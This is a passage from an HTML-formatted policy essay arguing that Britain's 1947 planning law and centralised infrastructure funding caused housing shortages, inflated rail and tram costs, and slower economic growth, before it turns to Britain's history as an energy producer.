            a vast system of commuter rail, electric trams and motorbuses that
            enabled and served these new neighbourhoods. The English housing
            stock
            <a href="https://www.designingbuildings.co.uk/wiki/English_housing_stock_age">nearly doubled in twenty years</a>, transforming the living standards of the English people.
          </p>

          </p>
          <p>
            As late as the 1930s, there were almost no restrictions on
            development, other than generous height limits in some cities (about
            ten storeys) and some building safety regulations. Subject to those,
            any property owner
            <a href="https://capx.co/solving-the-planning-problem/">could build virtually anything they wanted</a>. After 1909, developers did have to get permission to develop, but
            councils almost always gave it, since they had to compensate
            landowners for the lost value if they rejected permissions, and
            councils were themselves generously compensated through local
            property taxes if they accepted development.
          </p>
          <p>
            In sum, before the 1940s, British cities grew as their industries
            did. People moved, in their millions, around the country. People
            moved to places where wages were higher, raising wage competition
            for workers in the places that they left. This meant that there were
            fewer and narrower persistent income differences between places than
            those we see today. Liberal development policy generated a country
            with a natural force pushing against persistent, entrenched regional
            inequality,
            <a href="https://www.bensouthwood.co.uk/p/regional-inequality-also-a-housing">which was narrowing in the decades to the 1940s and has been
              widening since</a>.
          </p>
          <h4 id="the-source-of-the-problem">The source of the problem</h4>
          <p>
            In 1947, the Town and Country Planning Act (TCPA) was introduced,
            part of the postwar reform programme that nationalised nearly every
            major industry, from
            <a href="https://www.adamsmith.org/blog/steel-nationalized">steel</a>
            to
            <a href="https://en.wikipedia.org/wiki/Transport_Act_1947">man-with-van road haulage companies</a>, and normalised top tax rates at over 90 percent. The TCPA
            completely removed most of the incentive for councils to give
            planning permissions by removing their obligation to compensate
            those whose development rights they restricted. Other reforms at
            around the same time also redistributed away much of the upside that
            councils had received from development through local property taxes.
          </p>
          <p>
            The law also added a requirement to get permission from
            <em>national government</em> for any development, and to pay to the
            national government a tax of 100 percent on any value that resulted
            from permission being granted. Most notoriously, the TCPA instituted
            the legal powers that were used to create and expand green belts the
            following decade, prohibiting development on large rings of land
            around England’s cities.<sup><a href="#footnote-1" id="footnote-source-1">1</a></sup>
          </p>
          
          <p>
            Overall, it moved Britain from a system where almost any development
            was permitted anywhere, to one where development was nearly always
            prohibited. Despite some minor later liberalisations, like the
            introduction of permitted development rights in the 1980s, the
            underlying problem remains. Since the TCPA was introduced in 1947,
            private housebuilding has never reached Victorian levels, let alone
            the record progress achieved just before the Second World War.
          </p>
          <p>
            Today, local authorities still have robust powers to reject new
            developments, and little incentive to accept them. Historically,
            local governments encouraged development because their tax bases
            grew in line with the extra value created, but this incentive has
            been
            <a href="https://www.sambowman.co/p/one-weird-trick-to-get-data-centres">eroded by successive reforms that have centralised and capped
              local governments’ tax-raising powers</a>.
          </p>
          <p>
            National governments have not been blind to the fact that
            development is not happening. Their solution to the problem has
            generally been
            <a href="https://worksinprogress.co/issue/why-britain-doesnt-build/">to try to force local governments to permit the homes the country
              needs</a>
            (and take the political flak that engenders) through targets and
            punishments. But this system has never managed to raise building
            rates by anywhere near enough to return prices to the downward trend
            they were on for hundreds of years until 1938.
          </p>
          <p>
            Attempting to force local governments to build more homes has
            repeatedly backfired, and where it has delivered new homes they have
            often been
            <a href="https://eprints.lse.ac.uk/26348/">low quality and far from where the highest demand for homes is</a>, since the targets are calculated with almost no reference to
            actual demand for new houses. There is little reason to think the
            new government’s plans will be very different, and
            <a href="https://www.thetimes.com/uk/politics/article/labour-needs-to-build-homes-where-people-want-to-live-zv6vlk53f">its decision to lower London’s target as a ‘reward’ for failing
              to meet its previous targets</a>
            is a sign that it, too, will fail to build homes where they are
            needed most.
          </p>
          <p>
            Local people bear many of the costs of new development – disruption,
            congestion, and competition over access to state-provided services
            like healthcare and education. At the same time, they gain few or
            none of the benefits, the obvious exception being those local
            landowners who actually receive the planning permissions. It is thus
            unsurprising that local people tend to be
            <a href="https://journals.sagepub.com/doi/10.1177/09516298211044852">fierce opponents of development</a>. When the national government has tried to take away their right
            to control development nearby, they have resisted vigorously,
            <a href="https://www.mirror.co.uk/news/politics/government-ditches-mutant-housing-formula-23176334">usually succeeding in having the targets revoked or watered
              down</a>.
          </p>
          <p>
            This has contributed to a climate that is supportive of continual
            increases in regulations at the national level, which add process
            and cost to development. Recently, this has meant compulsory
            <a href="https://www.samdumitriu.com/p/against-banning-buildings-with-just">second staircase requirements</a>, which ban apartment blocks with only one staircase and lift core
            – the standard type in nearly every country in the developed world.
            (The Government’s own impact assessment of the second staircase
            rules determined that
            <a href="https://x.com/s8mb/status/1775116154291224839">their costs would be more than two hundred times greater than
              their benefits</a>.) It has also meant reducing the sizes of windows: it is now
            legally difficult to build windows
            <a href="https://x.com/SCP_Hughes/status/1674006804076920834">as large as those common in Georgian and Victorian buildings</a>, apparently because they cause overheating in hot weather, and
            because people might supposedly fall out of them.
          </p>
          <p>
            The same climate has facilitated rules requiring every development
            to prove ‘nutrient neutrality’, to survey for protected species like
            newts and bats (even
            <a href="https://www.ft.com/content/a080c618-c250-45cf-9728-8ec8ddd0a56c">in places where their presence has never been detected</a>), and more.
          </p>
          <p>
            High housing costs also create the demand for destructive policies
            that appear to alleviate the proximate problems of expensive housing
            without dealing with the underlying issue. In many cases today, as
            many of 40 percent of a new development’s homes must be subsidised
            for ‘affordable’ renters instead of being made available at market
            rates. These requirements function as a tax on new housing (and so
            local objectors often support them), redistributing income from
            every other private tenant to a lucky few. Countries with expensive
            rental housing also see movements for rent controls, and punitive
            rental regulations, like giving every tenant the permanent right to
            live in the property they occupy.

            The economic effects of housing shortages
          </h4>
          <p>
            Since the introduction of the British planning system in 1947,
            <a href="https://worksinprogress.co/issue/why-britain-doesnt-build/">there has been very little increase in housing supply when better
              jobs make an area more desirable</a>. Instead of extra homes being built, workers competing for scarce
            housing
            <a href="https://www.worksinprogress.news/p/agglomeration-benefits-are-here-to">are forced to bid up the price of existing homes</a>. This means that many of the income gains go to existing landlords
            and landowners, and that many people cannot move to better jobs at
            all.
          </p>
          <p>
            Because only the best paid people can afford to move to the most
            prosperous cities,
            <a href="https://www.bensouthwood.co.uk/p/regional-inequality-also-a-housing">there is no longer general migration across the economic
              spectrum</a>, as there was in the nineteenth century when it was
            <a href="https://cepr.org/voxeu/columns/productivity-and-migration-new-insights-19th-century#:~:text=From%20brief%20inspection%2C%20it%20is,concentrated%20in%20low%2Dskilled%20jobs.">the <em>poorest</em> people who were most likely to move to find
              better work</a>. Today, this has created a situation where only the most gifted
            and educated people can afford to move to richer cities and stay
            there. Their less well-off peers are quite literally ‘left behind’,
            and compete with one another over a narrow pool of jobs, driving the
            wages down even further, making those places feel even more
            deprived.
          </p>
          <p>
            On the other hand, social housing anchors many people to extremely
            central, high-value areas in our major cities. A staggering amount
            of central London’s housing is socially rented:
            <a href="https://www.ons.gov.uk/census/maps/choropleth/housing/tenure-of-household/hh-tenure-5a/rented-social-rented">40.2 percent of Islington households</a>
            are on subsidised social rents; as are 33.7 percent of Camden’s;
            35.9 percent of those in Tower Hamlets; and 39.7 percent of
            Southwark’s. These households occupy some of the most valuable space
            in the country, and are trapped in their tenancies, remaining even
            when their homes, often damp, poorly insulated, and altogether
            dilapidated, are no longer fit for their changing circumstances,
            because they will likely end up in a less valuable, less
            centrally-located property if they try to move.
          </p>
          <p>
            The result is a ‘missing middle’ in cities like London, where only
            the very well-off and very badly-off can afford to live there,
            excluding lower- and middle-income people from elsewhere in the
            country. Even many higher earners cannot afford to live anywhere
            near the centre once they have children. The impoverishment of
            coastal and post-industrial towns cannot be understood without
            looking at housing shortages in more prosperous parts of the
            country: both are the products of Britain’s planning system.
          </p>
          <p>
            Since the supply of homes in successful cities is tightly
            constrained, the growth of our most successful companies and sectors
            within those cities is constrained as well. Even the people who do
            get to live in high-productivity places are less productive than
            they could be, since their employers are less able to hire mid- and
            lower-skilled people to support them in the workplace. It is
            inconceivable that Britain could have had the Industrial Revolution
            if it had banned workers from moving to the coalfields of South
            Wales and Yorkshire and the textile factories of Lancashire. It is
            not an exaggeration to say that Britain could be forgoing its role
            in another industrial revolution today – that of artificial
            intelligence, biotech, and related technologies – by making the
            corresponding mistake.

            Britain is not the only country that has slowed its growth through
            holding back agglomeration. Parts of America have seen similar
            shortages. Economists Gilles Duranton and Diego Puga
            <a href="https://www.nber.org/papers/w26591">judge that</a> if the
            whole of New York City allowed the densities that were common in
            Georgian and Victorian London, rents and house prices would fall
            towards construction costs, and the metropolitan area would at least
            double in population, to over 40 million people. Similar things
            would happen to the Bay Area, Boston, Los Angeles, and other US
            ‘superstar’ cities if higher densities were allowed. Duranton and
            Puga argue that huge economic growth would result from allowing
            these superstar cities to build more.

            The fundamental issue is that British cities are not allowed to
            expand upwards <em>or</em> outwards, whereas most American cities,
            like those of France, Italy and Germany, have at least been able to
            sprawl. Under the liberal system of the nineteenth century, late
            twentieth century Cambridge’s huge success in life sciences would
            have led to both taller buildings and many new suburbs, connected by
            new train lines, trams, tubes, and roads. It would likely have a
            population of at least a million today, just as Glasgow grew from a
            population of 70,000 in 1800 to over 700,000 in 1900 to facilitate
            its world-leading shipbuilding industry.

            Today, nearly all of the potential is blocked. Scarce property means
            people cannot move to take up the job opportunities on offer. Some
            businesses never start. Others are not as productive as
            international competitors. Others fail to scale up to become
            unicorns or bigger.

            Cambridge is not alone. Many of our smaller but richer cities and
            towns, places like Oxford or York, cannot grow up or out. The people
            who might have lived there, earning £600 or £700 a week, instead
            live in more deprived areas, earning £400. The same is true of
            London. It is hard to build new housing or office space, making it
            hard for businesses to expand, and hard for workers to move to these
            places to take up good jobs.

            The postwar housing system has underdelivered since the 1950s: the
            enormous improvements in housing affordability in the Victorian and
            Edwardian eras stalled as soon as the new system was introduced. The
            problem became ever more severe each decade, even before the
            population began to rise rapidly: average private home sizes
            actually got <em>smaller</em> during the 1960s and 1970s. But the
            problem has escalated into a disaster in the last few decades, as
            massive net immigration, an ageing population, and unforeseen
            economic change have together led to huge unmet housing demand in
            the South. The social challenges that accompany high levels of
            immigration have been hugely amplified by the persistent lack of
            planning reform.

            From the eighteenth to the early twentieth centuries, Britain had
            easily the best transport infrastructure in the world. In the
            eighteenth century, a total of
            <a href="https://www.routledge.com/Economic-History-of-Transport-in-Britain/Savage-Barker/p/book/9780415512374?srsltid=AfmBOopr7hzFO54JklMfdHkVMSYpuXv4voHUa39zU63tOxiuIAYBI5bh">1,116 private companies built and renewed 22,000 miles</a>
            of tolled roads, while other companies dug 4,000 miles of canals.
            The result was by far the best transport system in Europe. In the
            nineteenth century, Britain built a system of railways that is still
            impressive today, despite having hardly been added to since 1914 (in
            fact,
            <a href="https://preview.redd.it/r0ypgwbv6ri31.jpg?auto=webp&amp;s=637b6bc1d04a19acea33a6ad6aab45af81b4db88">we have half as many miles of railway today than we did then</a>). London had an extensive underground railway system in the 1860s,
            almost four decades before the first underground metro line anywhere
            else in the world. In fact, the word ‘metro’ for underground
            railways comes from the Metropolitan Line, the world’s first.
          </p>
          <p>
            In little more than a decade around 1900, private entrepreneurs
            built five more underground lines totalling hundreds of kilometres,
            still at no cost to the taxpayer. Ninety British municipalities laid
            electric tram networks in less than twenty years, including Europe’s
            longest (in London), while private companies created a gigantic
            fleet of motor buses. This superb transport system was one of the
            conditions of Britain’s revolutionary economic expansion, and of
            London’s position as the foremost city and unquestioned economic
            capital of the globe.

          </p>
          <p>
            Although Britain’s historic infrastructure was largely delivered by
            the private sector (and to a lesser extent by local councils), the
            state did have a role. Delivering national infrastructure is
            extremely difficult without compulsory purchase powers: if every
            property owner on the route of a railway can play holdout, it is
            extremely unlikely to be practicable to buy them all out
            voluntarily. Until the 1940s, these powers were created through
            private Acts of Parliament: a select committee considered requests
            for compulsory purchase powers from the project’s promoters, and if
            they believed the project was in the national interest,
            <a href="https://x.com/bswud/status/1717510189744583130">they created an <em>ad hoc</em> law giving the promoters the
              powers they needed to make it happen</a>. This system was extraordinarily swift and inexpensive: the
            planning process for major national projects generally took months.

          <p>
            By contrast, today’s system is broken. For a whole range of
            infrastructure – railways, trams, nuclear power, and more – building
            has become vastly more expensive than competitors across Europe and
            East Asia. The consenting of major projects usually takes years, and
            sometimes decades. A suite of reforms in 2008
            <a href="https://www.samdumitriu.com/p/the-solar-cliff-edge">seems to have produced only moderate improvements, many of which
              have since been lost</a>. A key national strength has become a key national weakness.

          <p>
            On a per-mile basis, Britain now faces some of the highest railway
            costs in the world. These costs push numerous potential schemes into
            financial unviability – schemes that would have prospered in the
            past, and that would prosper in other countries today. High
            construction costs are effectively precluding a rail transport boom
            such as Britain enjoyed in the nineteenth century, or France is
            enjoying today.
          </p>
          <p>
            Even if it had only cost as much as planned in 2013, HS2 would have
            been between two and four times more expensive than high speed rail
            lines in Italy and France. In fact it cost a lot more: the section
            we end up building will be between four and eight times more
            expensive per mile than French or Italian high speed rail projects.
          </p>
          <p>
            At £18.1 billion for the tunnelled Paddington to Stratford section,
            the Elizabeth Line (Crossrail) was the second most expensive metro
            line ever built, at £1.4 billion per mile. By comparison, Madrid
            <a href="https://www.city-journal.org/article/subway-lessons-from-madrid">built</a>
            a 120-mile new underground network in twelve years (with much of the
            network open after just four years) for
            <a href="https://tunnelbuilder.com/metrosur/edition2pdf/page2.pdf">£68 million per mile</a>
            – twenty times cheaper than Crossrail and nine times cheaper than
            the Jubilee line extension built around the same time. Copenhagen
            built a 9.6 mile underground line in 2019 at a total cost of £3.4
            billion or £350 million per mile (four times cheaper). Crossrail 2
            (if it is ever built) is expected to cost even more than the
            Elizabeth Line did per mile.
          </p>
          <p>
            Despite its astonishing construction cost, the Elizabeth Line is so
            valuable to London that it is probably <em>still</em> good value for
            money. But if construction costs were more moderate, dozens of other
            rail schemes would be good value for money too.

          <p>
            Britain has also lagged behind on electrification, one of the most
            important transformations in modern railway technology. Electrified
            railways are
            <a href="https://www.samdumitriu.com/p/infrastructure-costs-electrification">simply better</a>
            - they allow trains to accelerate faster and reach higher speeds.
            Electric trains require at least five times less maintenance and
            suffer fewer breakdowns compared to diesel trains, driving huge
            gains in reliability. These lower maintenance costs, combined with
            the fact that expensive diesel isn’t needed to power the trains,
            means that electrification often saves money in the long run.
          </p>
          <p>
            In the 1890s, electrification rapidly transformed intra-city rail
            transport. In London alone, the Northern, Piccadilly, Bakerloo,
            Central and Waterloo &amp; City Lines were opened between 1890 and
            1906, transforming urban mobility and galvanising a wave of suburban
            expansion. But although intercity electrification has been possible
            for many decades, it has been adopted painfully slowly. Just 38
            percent of British railways are electrified, compared to 71 percent
            of railways in Italy, 61 percent in Germany, and 55 percent in
            France. India recently
            <a href="https://x.com/GTCarfree/status/1745861787600531837">electrified hundreds of thousands of kilometres of its network in
              just ten years</a>
            – it is now 94 percent electrified. Once more, the key constraint is
            cost: British per mile electrification costs are
            <a href="https://www.samdumitriu.com/p/infrastructure-costs-electrification">more than double</a>
            those of Germany or Denmark.<sup><a href="#footnote-5" id="footnote-source-5">5</a></sup>

          <h4 id="tramways">Tramways</h4>
          <p>
            Trams are potentially a far cheaper way of doing mass transit than
            underground railways. In the early twentieth century, some
            <a href="https://assets.nationbuilder.com/britainremade/pages/1451/attachments/original/1723813389/BRM7607_Tram_Report_Digital-Single-Pages_AWK.pdf?1723813389">two hundred</a>
            British towns and cities had trams: an immense network that flowered
            between 1890 and the 1950s, enabling urban expansion, economic
            growth and higher living standards.
          </p>
          <p>
            Due to their efficiency on heavily travelled routes, many countries
            are now renewing and reopening tram lines. The outstanding case is
            France, which has built 21 tramways in recent decades. Britain has
            begun to make efforts to do the same, but
            <a href="https://www.samdumitriu.com/p/britains-infrastructure-is-too-expensive">Britain's tram projects are 2.5 times more expensive than
              French projects per mile</a>, hamstringing the renaissance of the tram in this country. There
            are now French cities of 150,000 people with fast modern tram
            systems - towns comparable in size to Carlisle or Lincoln. It is
            inconceivable that cities of this size could get tramways in England
            at current build costs.
          </p>
          <p>
            This has led to some profoundly dissatisfying outcomes. Leeds is now
            the largest city in Europe without a metro system: there are about
            830,000 people in the official greater Leeds area,
            <a href="https://en.wikipedia.org/wiki/ESPON_metropolitan_areas_in_the_United_Kingdom">2.3 million in the broader metropolitan area</a>, and
            <a href="https://www.tomforth.co.uk/circlepopulations/">2.6 million within 50 kilometres</a>, the same as Munich. Munich has an 11.4 kilometre tunnel in the
            centre of the city allowing it to turn its seven commuter railways
            into Crossrails, plus eight <em>underground</em> metro lines with
            around 100 stations, totalling more than 100 kilometres in length.
          </p>
          <p>
            In 1993, the John Major government
            <a href="https://www.legislation.gov.uk/ukla/1993/15/pdfs/ukla_19930015_en.pdf">granted all the necessary powers to build a Leeds ‘Supertram’</a>. But it would have cost £1 billion (£1.6 billion in 2023 prices),
            on a per-mile basis twice the cost of the average French tramway.
            This is a key reason why it hasn’t been built in the 31 years since.
            It’s an especially ironic failure given that a daring private
            company opened Europe’s first overhead-powered tram network in Leeds
            in 1891 – a wildly successful project that was subsequently emulated
            in every major city.

          </h4>
          <p>
            There are a range of proximate causes for Britain’s high
            infrastructure costs. Some of them are unalterable: for example,
            Britain was the first place to install below-street utilities, so we
            don’t have a very good idea of the pipes hidden under our feet, and
            tunnelling through soft London clay can perversely be more difficult
            than through hard Norwegian rock. But many of the key factors have
            appeared during the last two to three decades, the period during
            which infrastructure costs have exploded.
          </p>
          <ul>
            <li>
              We gold plate designs, spending extra billions on features that
              don’t enhance functionality, as with the award-winning Jubilee
              Line stations, or the plan for HS2 to run
              <a href="https://en.wikipedia.org/wiki/High-speed_rail">60 kilometres per hour faster than is typical for European
                high-speed rail</a>. Older infrastructure systems like the Victoria Line, the DLR or
              the Croydon Tramlink made do with simple repeated station designs,
              which hugely reduced their cost: the same tends to be true with
              Continental transport infrastructure today.

              We often redesign projects multiple times in response to
              successive waves of ‘stakeholder’ interventions. Successful
              projects manage this by empowering specialists to make engineering
              and design decisions on the fly.

              Instead of a steady pipeline of projects, we have a ‘<a href="https://www.frpadvisory.com/blog/building-futures-whats-next-for-uk-infrastructure/">feast and famine</a>’ approach. Germany electrifies roughly 200 kilometres of track
              every year, while Britain oscillates between electrifying
              <a href="https://www.samdumitriu.com/p/infrastructure-costs-electrification">0 and up to 900</a>. This inconsistency prevents businesses from investing in
              equipment and training construction workers, and stops civil
              servants developing expertise about efficiently running these
              projects.
            </li>
            <li>
              All these problems lead to high borrowing costs for the
              engineering companies contracted to deliver the projects, because
              of the risks they incur (e.g.
              <a href="https://committees.parliament.uk/writtenevidence/109297/pdf/">two thirds of the cost of Hinkley Point C is financing the
                project</a>).

          <p>
            Analysis of the failures of British infrastructure delivery tends to
            stop here. But we believe that these proximate causes largely arise
            from a common source, which is the excessive centralisation of
            funding and consenting of infrastructure in the national government
            that has steadily taken place since the 1990s. This has dramatically
            narrowed the constituency who want infrastructure projects to go
            ahead while also wanting to minimise their costs. The various ways
            in which British infrastructure projects have become increasingly
            slow, contested and expensive are all functions of this underlying
            mechanism.
          </p>
          <p>
            In the nineteenth and early twentieth centuries, infrastructure was
            generally funded and delivered privately. The railway system, the
            canal network, the turnpike roads and the London Underground were
            all built by private companies.
          </p>
          <p>
            Quasi-private models remained common to the end of the twentieth
            century, including ‘build, own, operate, transfer’ (the Channel
            Tunnel) and the private finance initiative (M6 Toll, Tramlink).
            Other schemes were delivered through arms-length bodies, like London
            Transport (Victoria Line). Others still were delivered by local
            governments. Most of Britain’s 300-some tram networks were laid by
            local authorities, with neither support nor direction from national
            government.
          </p>
          <p>
            In all of these cases there is a strong constituency who
            <em>both</em> strongly want the project to go ahead,
            <em>and</em> also want costs to stay low. Private companies may
            literally cease to exist if they fail to deliver their product while
            keeping costs reasonably low, and although local governments will
            continue to exist in some form, local councillors will be punished
            severely by the small local electorates who have to pick up the bill
            generated by their mismanagement. Companies and financially
            responsible local governments thus have a vivid interest in keeping
            costs down if they are on the hook for them, and they will lobby
            zealously against cost bloating. A
            <a href="https://www.amazon.co.uk/Tramways-Trolleys-Urban-Transport-Europe/dp/0691052409">leading historian of Britain’s tram networks</a>
            writes of the ‘ardent desire’ of local councils that tram networks
            turn a profit, which could then be used to subsidise other services
            or cut local rates. Sure enough, councils vigorously cut costs,
            dispensing with the expensive underground wire systems that were
            widely used in Continental cities as a sop to local objectors.
          </p>
          <p>
            This pattern of behaviour continues to hold today in many countries.
            French cities pay 50 percent towards nearly all mass transit
            projects that affect them, and sometimes 100 percent (with regional
            and national government contributing the rest). Unsurprisingly, they
            then fight energetically to suppress cost bloat, and they generally
            succeed. The Madrid Metro, one of the world’s finest systems, was
            funded entirely by the Madrid region. A smaller and poorer
            municipality than London succeeded in financing 203 kilometres of
            metro extensions with 132 stations between 1995 and 2011, about 13
            times the length of the contemporary Jubilee Line Extension in
            London. Other countries still operate systems of private
            infrastructure delivery: Tokyo’s legendary transit network is
            delivered, and regularly expanded, by private companies who
            <a href="https://etd723z5379.exactdn.com/app/uploads/2024/04/2198_1524_LP2011_ch12_Transit_Value_Capture_0.pdf">fund development by speculating on land around stations</a>. France’s superb system of motorways is built and maintained by
            private companies, who manage them with vigour and financial
            discipline.
          </p>
          <p>
            In Britain, the centralisation of infrastructure delivery in the
            national government has fundamentally weakened this incentive. No
            public body will ever have quite the existential interest in cost
            control that a private one does. But national government also has a
            weaker interest in it than a financially responsible local
            government does, because the cost is diffused around a vastly larger
            electorate. The £300 million spent on the Lower Thames Crossing
            consenting process is one of the great absurdities of modern British
            governance, but it still comes to less than £5 per British person.
            For almost any given infrastructure project, the national Government
            can waste money buying off militant stakeholder groups, and the
            immediate cost remains invisibly small to the huge electorate that
            ultimately bears it. But the aggregate effect of all these small
            pay-offs is outrageous cost bloat, unaffordable infrastructure, and
            the relative impoverishment of the country.
          </p>
          <p>
            Consider the Edinburgh Tram. It was built in two phases. The first,
            completed in 2014, was described as ‘<a href="https://benhopkinson.substack.com/p/hell-on-wheels-the-edinburgh-trams">hell on wheels</a>’, by its former chairman, overrunning from a £545 million budget
            to £776 million. Of the original budget,
            <a href="https://www.edinburghtraminquiry.org/final_report/the-inquiry-report/">£500 million came directly from the Scottish government</a>, and £45 million was provided by the council. The second,
            completed in 2023, was funded by borrowing against future fare
            revenues. It came in
            <a href="https://www.samdumitriu.com/p/infrastructure-costs-trams">about thirty percent cheaper per mile</a>.
          </p>
          <p>
            Most of the proximate causes listed above are ways in which this
            underlying pattern manifests itself. Profligate gold-plating,
            exorbitant community compensation, endless rounds of consultation,
            elaborate legal obligations, reliance on consultants and so on all
            naturally arise when none of the parties involved has any serious
            incentive to oppose them. If Britain wants affordable
            infrastructure, it needs a system in which those who make the
            decision to spend money also bear some of the costs of doing so.
          </p>
          <p>
            The most conspicuous result of this cost bloat is of course that the
            infrastructure projects that do happen tend to be wildly expensive.
            But perhaps the most important effect is the projects that do not
            happen at all. The Treasury correctly believes that, under current
            conditions, public infrastructure projects in Britain will be
            wastefully mismanaged. Its only way of protecting public finances is
            thus by blocking these projects altogether. Given the means
            available to it, this decision is often the correct one.
          </p>
          <p>
            But stepping back, we should recognise that many of the projects
            blocked by the Treasury could have excellent value for money if only
            they were delivered at costs that were historically and remain
            internationally normal. The notorious ‘feast and famine’ procurement
            pattern of some types of British infrastructure is also thought to
            be a consequence of this; the Treasury blocks routine schemes, so
            only schemes with exceptional political or economic support take
            place, which by nature arise only intermittently and unpredictably.
          </p>
          <p>
            The theory that infrastructure costs are prone to bloating when they
            are paid for centrally is supported by the example of the one kind
            of infrastructure that has remained relatively cheap, namely roads.
            Despite some big failures like
            <a href="https://www.samdumitriu.com/p/a-boring-story-about-infrastructure">the Lower Thames Crossing</a>, Britain ranks
            <a href="https://www.britainremade.co.uk/britain_paying_up_to_eight_times_more_than_eu_for_road_and_rail_projects_research_finds#:~:text=A%20study%20by%20Britain%20Remade,Italy%2C%20Sweden%2C%20and%20Norway.">mid-table</a>
            overall, a better performance than for any other infrastructure
            type. The reason for this is that roads directly benefit a much
            wider constituency than any given railway project:
            <a href="https://onlinepubs.trb.org/Onlinepubs/trr/1976/583/583-004.pdf">pretty much anyone in the nearby area</a>
            rather than just the people
            <a href="https://pbs.twimg.com/media/F9WxjexWwAAnEnw?format=jpg&amp;name=large">within about one kilometre of a given station</a>. What’s more,
            <a href="https://www.gov.uk/government/statistics/national-travel-survey-2022/national-travel-survey-2022-factsheet-accessible#:~:text=Cars%20remained%20the%20most%20popular,1%20percentage%20point%20from%202019).">94 percent of miles travelled in the UK are on roads</a>
            (80 percent in private cars, and 14 percent on buses and coaches),
            so many more people see themselves as having a stake in the issue.
            The tendency for local obstructionism is thus weaker, and even
            national government tends not to end up with spiralling costs. For
            the bulk of the projects, funded (or part-funded) and delivered by
            local councils themselves, the effect is even stronger.
          </p>
          <p>
            This is why the M25 could be delivered affordably through the
            traditional planning system, even with a spectacular 39 separate
            inquiries. In 1987, the first election after the M25 was finished
            and opened, Margaret Thatcher’s Conservatives won every constituency
            the road went through, including large swings in historic Labour
            seats like Thurrock.
          </p>
          <p>
            But this model only works for this kind of locally uncontroversial
            infrastructure. For the contentious but vital projects that the
            country needs – railways, viaducts, bridges, nuclear power stations,
            tramways, wind farms – systemic reform is needed.
          </p>
          <h4 id="why-this-matters">Why this matters</h4>
          <p>
            Because of bad delivery mechanisms, British infrastructure is
            delivered slowly and at great cost. When infrastructure is costly,
            less of it is delivered. To understand how bad this is, it is worth
            reviewing why infrastructure is important.
          </p>
          <p>
            Like housing, transport infrastructure is vitally important for
            growth because it determines who can do which jobs. Reliable, fast
            transport infrastructure allows people to access a wider range of
            job options, and businesses to access a wider pool of talent to
            employ and to transport goods and services more easily. By
            increasing the speed you can get around, infrastructure expands the
            effective ‘economic size’ of a city, no less effectively than
            building more houses does. A ten percent increase in the number of
            jobs accessible per worker increases productivity 2.4 percent. A 10
            percent increase in commuting speed
            <a href="https://x.com/Sam_Dumitriu/status/1101073388322410496">increases the size of the labour market by 15–18 percent</a>. Without the M25 and the suburban railway network, places like
            Sevenoaks, Luton, Reading, Guildford, Stansted, Chelmsford, and
            Woking would not be tied economically to the broader London
            metropolis. Companies in those places would not be able to hire from
            as big a pool; people living there would not be able to reach the
            best jobs.
          </p>
          <p>
            It also enables both internal and cross-border trade. The Eurostar
            helps British services firms sell to Parisian and Brusselian
            companies. Heathrow is a core reason why international firms have
            headquarters in London. The strategic road network lets companies
            and consumers all over the country import and export goods through
            the country’s seaports.
          </p>
          <p>
            Britain’s transport infrastructure deficit means that it forgoes
            these benefits. We can’t build new tramways or a metro cheaply in
            Birmingham, so the city is
            <a href="https://www.tomforth.co.uk/birminghamisasmallcity/">riddled with road congestion</a>, and people choose lower-paying jobs with worse working conditions
            because they are easier to get to rather than because they are the
            best for their careers. Without the Lower Thames Crossing, road
            haulage to and from the Ports of Dover and Felixstowe has to move
            over the congested and further-flung Dartford Crossing, slowing down
            and raising costs for British firms looking to trade
            internationally.
          </p>

            <span>Commuting flows in England and Wales. High quality infrastructure
              is the reason why so many can commute miles to bigger job markets
              than where they live.</span>
          </p>
          <p>
            A second and vitally important benefit from all infrastructure is
            that, without it, locals oppose new homes near them. If there is
            already congestion on the roads they use, or they are already unable
            to get a seat on their morning train,
            <a href="https://worksinprogress.co/issue/growing-the-growth-coalition/">they have a powerful reason to oppose new development</a>. Thus, new infrastructure enables new homes and makes them
            politically much easier to build. The infrastructure deficit makes
            them correspondingly harder.
          </p>
          <p>
            In some cases, the infrastructure deficit is literally making new
            development in Britain unlawful. Because Britain has not built a new
            reservoir for thirty years, there are chronic water shortages in the
            East of England. This means that the Environment Agency has begun to
            <a href="https://www.planningresource.co.uk/article/1828079/environment-agency-objects-plans-almost-5000-homes-significant-risk-water-demand">block new housing</a>
            on the basis that it could only be supplied with water through
            drawing on environmentally valuable chalk streams. The result is
            that it is virtually unlawful for the Government to permit the
            expansion of Cambridge, leading to the gradual strangulation of
            Britain’s biotech industry. The same problem will compromise any new
            town scheme that the Government wants to initiate in large parts of
            the country.
          </p>
          <p>
            This chapter has focussed on the deficit in transport
            infrastructure. But there is another infrastructure deficit that is
            at least as grave: energy. Energy costs are rising steeply in
            Britain, starving energy-intensive industries and undermining living
            standards. This disastrous trend has deep causes, to which we turn
            in the next chapter.

            Britain: the first energy superpower<sup><a href="#footnote-6" id="footnote-source-6">6</a></sup>
          </h3>
          <p>
            Between 1550 and 1700, Britain transformed from a normal European
            country, depending on peat and wood for heating homes, to by far
            Europe’s biggest coal producer and consumer. Every coal-producing
            region upped its output by at least ten times. By 1640, Britain was
            mining around 1.5 million tonnes of coal per year, about three times
            as much as the rest of Europe put together.
          </p>
          <p>
            This energy boom set off growth in an uncountable number of other
            industries. The Firth of Forth started exporting salt all over
            Europe, including to salt-producing regions like the Low Countries.
            Britain’s coal allowed it to become a major producer of soap,
            candles, starch, saltpetre (for gunpowder), alum and copperas (for
            fixing dyes into clothes), as well as being used in brewing, dyeing,
            making malt, baking bread, making tiles and bricks, forging and
            working iron, copper, brass, lead, silver, and tin, glass, and
            bending staves and beams for barrels and ships.
          </p>
          <p>
            It went much further than these cases. Coal is used to produce lime.
            Cheaper and more abundant coal meant dramatically more lime.
            Dramatically more lime meant dramatically more fertiliser, which
            meant much more productive grain fields. More salt meant more meat
            and fish preservation, raising the productivity of pasture land.
            Peatlands and heaths were no longer necessary for fuel, so they
            could be converted to arable land or pastures.
          </p>
          <p>
            All of this meant more muscle power – horses and oxen – which
            powered the earliest machinery. These animals were put to an
            enormous range of uses, and their extreme proliferation in Britain
            wowed Europeans throughout the 1600s and 1700s. And it meant more
            human muscle power. The average Briton ate something like 600
            calories more per day than the average Frenchman, and was about five
            centimetres taller.
          </p>
          <p>
            All this is to say that Britain was the first energy superpower, and
            it built its global economic dominance on the back of, above all,
            cheaper and more abundant energy than anywhere else. Until the 1920s
            it produced more energy per person than any other country. Until the
            1960s it produced more energy than any other country but America.

            As coal’s enormous downsides were recognised – horrific lung issues
            for those mining it and inhaling its fumes, as well as devastating
            smogs – in 1956 we became the first of all countries to move to the
